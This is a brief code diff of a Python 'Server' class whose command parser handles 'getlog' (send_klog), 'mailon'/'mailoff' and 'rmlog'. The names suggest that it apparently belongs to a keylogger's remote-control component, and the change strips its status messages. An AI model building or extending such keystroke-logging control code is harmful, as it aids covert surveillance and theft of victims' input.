@@ -38,13 +38,10 @@ class Server:
     def parse_cmd(self, cmd):
         if cmd == 'getlog':
             self.send_klog()
-            print("[+] Sent log")
         elif cmd == 'mailoff':
             self.mail_off()
-            print('[+] Mail turned off')
         elif cmd == 'mailon':
             self.mail_on()
-            print('[+] Mail turned on')
         elif cmd == 'rmlog':
         	self.parent.logger.del_log()
         	print('[+] Log deleted')
